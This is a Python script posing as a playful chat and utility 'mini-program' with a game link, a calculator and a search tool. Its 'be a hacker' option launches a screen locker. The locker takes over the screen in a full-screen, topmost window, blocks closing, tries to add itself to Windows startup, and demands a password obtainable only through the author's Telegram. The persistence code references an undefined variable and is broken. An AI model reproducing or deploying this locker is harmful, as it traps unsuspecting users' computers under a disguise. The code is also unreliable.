import webbrowser
import time
import getpass
import os
import os.path
import sys
from tkinter import *
from tkinter import ttk

# Приветственные сообщения
print('Welcome to Mini-program by Mandi')
time.sleep(0.3)  # Пауза
name = input('Please, Write your name: ')
print('Hi ' + name + '!')

# Ввод состояния пользователя
case = input('How are u, ' + name + '? ').lower()  # Получение настроения пользователя
# Ответ в зависимости от настроения
if 'some' in case:
    print('O, ok, I want to cheer u up!')
elif 'good' in case or 'not bad' in case or 'cool' in case or 'fine' in case:
    print('Fine! Ok, so:')
elif 'bad' in case or 'not good' in case or 'poorly' in case or 'unwell' in case:
    print('Oh, I\'m sorry, I too, but lets talk to lift each other\'s spirits')
else:
    print('Em, ok, so:')

print('\n                 ***Write "Help" to view list of commands***                 \n')


# Функция для получения ввода пользователя
def get_doing():
    return input('What u gonna do now? ').lower()


# Основная функция, обрабатывающая действия пользователя
def doings(shit):
    do = get_doing()  # Вызов функции для ввода команды
    # Вспомогательная функция для выбора математической операции
    def action_op():
        operation = input('Write operation(+,-,\\,*): ')
        return operation

    # Обработка введенных команд
    if 'help' in do:
        print(
            '\n         Help\n         I want to play\n         Find me something(for example: House Photo, Meme or Street Image, etc.)\n         I want to calculate something\n         I want to be a hacker\\cheater\n         Exit\n         ')
    elif 'play' in do or 'game' in do:
        print('Ok, play in the best game!\n(Now game opening)')
        time.sleep(2)
        webbrowser.open('https://www.freefalltournament.com', new=2)  # Открытие игры в браузере
    elif 'math' in do or 'calc' in do:
        action = action_op()  # Выбор математической операции
        # Проверка на правильность введенной операции
        while action not in {'+', '-', '\\', '*'}:
            print('Please, write correct operation!')
            time.sleep(0.5)
            action = action_op()
        else:
            # Получение чисел и вычисление результата
            what_number1 = int(input('Write first number: '))
            time.sleep(0.2)
            what_number2 = int(input('Write second number: '))
            print("Result: ", eval(f'{what_number1}{action}{what_number2}'))  # Вычисление результата с помощью eval
    elif 'find' in do or 'search' in do:
        # Поиск по запросу в Google
        find_req = do.replace('find ', '').replace('me ', '').replace(' pls', '').replace(' please', '').replace('search ', '')
        if 'photo' in find_req or 'image' in find_req:
            webbrowser.open('www.google.com/search?q=' + find_req.title() + '&tbm=isch')  # Открытие поиска изображений
        elif 'video' in find_req:
            webbrowser.open('www.google.com/search?q=' + find_req.title() + '&tbm=vid')  # Открытие поиска видео
        else:
            webbrowser.open('www.google.com/search?q=' + find_req.title())  # Обычный поиск
    elif 'hacker' in do or 'cheater' in do:
        # Симуляция "хакерства" через интерфейс Tkinter
        print('Ok, now on your PC downloading "Software hard Cracker©" in downloads directory(~10 sec)')
        time.sleep(10)  # Эмуляция загрузки
        USER_NAME = getpass.getuser()  # Получение имени пользователя

        # Создание интерфейса через Tkinter
        window = Tk()
        window.title("Software hard Cracker")
        window.geometry('400x250')
        window['bg'] = 'black'

        # Определение размеров окна
        normal_width = 1920
        normal_height = 1080
        screen_width = window.winfo_screenwidth()
        screen_height = window.winfo_screenheight()

        # Масштабирование интерфейса в зависимости от разрешения экрана
        percentage_width = screen_width / (normal_width / 100)
        percentage_height = screen_height / (normal_height / 100)
        scale_factor = ((percentage_width + percentage_height) / 2) / 100
        fontsize = int(20 * scale_factor)
        minimum_size = 10
        if fontsize < minimum_size:
            fontsize = minimum_size

        fontsizeHding = int(72 * scale_factor)
        minimum_size = 40
        if fontsizeHding < minimum_size:
            fontsizeHding = minimum_size

        # Настройка стиля кнопок
        default_style = ttk.Style()
        default_style.configure('New.TButton', font=("Helvetica", fontsize))

        # Функция для добавления программы в автозагрузку
        def add_to_startup(file_path=""):
            if file_path == "":
                file_path = os.path.dirname(os.path.realpath(__file__))
            with open(bat_path + '\\' + "Google Environment.bat", "w+") as bat_file:
                bat_file.write(r'start "" %s' % file_path)

        # Блокировка закрытия окна
        def block():
            window.protocol("WM_DELETE_WINDOW", block)
            window.update()

        # Полноэкранный режим
        def fullscreen():
            window.attributes('-fullscreen', True, '-topmost', True)

        # Действие при нажатии кнопки
        def clicked():
            res = format(txt.get())
            if res == 'Hackers are Noobs':
                # Удаление файла из автозагрузки
                file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Environment.bat' % USER_NAME
                os.remove(file_path)
                sys.exit()  # Выход из программы
            else:
                txt_nopass = Label(window, text="Please, do not pick the password!", font=("Arial Bold", fontsize),
                                   fg='white', bg='black')
                txt_nopass.grid(column=0, row=0)
                txt_nopass.place(relx=.40, rely=.60)
                txt_nopass.after(1500, txt_nopass.destroy)

        add_to_startup("ToolBox2.exe")  # Добавление программы в автозагрузку
        fullscreen()

        # Текстовые элементы интерфейса
        txt_one = Label(window, text='WinLocker by Mandi', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
        txt_two = Label(window,
                        text='Your PC blocked by WinLocker, for unblock this, please Enter Pass!',
                        font=("Arial Bold", fontsize), fg='white', bg='black')
        txt_three = Label(window, text='You can know pass in my tg', font=("Arial Bold", 8), fg='white',
                          bg='black')
        txt_one.grid(column=0, row=0)
        txt_two.grid(column=0, row=0)
        txt_three.grid(column=0, row=0)

        txt_one.place(relx=.01, rely=.01)
        txt_two.place(relx=.01, rely=.11)
        txt_three.place(relx=.90, rely=.97)

        # Поле ввода и кнопка
        txt = Entry(window)
        btn = Button(window, text="Enter pass", command=clicked)
        txt.place(relx=.28, rely=.5, relwidth=.3, relheight=.06)
        btn.place(relx=.62, rely=.5, relwidth=.1, relheight=.06)

        block()
        window.mainloop()
    elif 'exit' in do or 'bye' in do:
        exit(0)  # Выход из программы
    else:
        print('Don\'t write this shit, pls.')
        shit += 1  # Увеличение счетчика "неверных" команд
    if shit == 7:
        print('If u keep it up, you\'re going to get in trouble.')
    if shit >= 8:
        print('Ok, bye!')
        time.sleep(1)
        exit(0)  # Завершение программы после нескольких ошибок
    return shit  # Возврат текущего значения счетчика
shit = 0
while True:
    shit = doings(shit)  # Вечный цикл, ожидающий команды пользователя
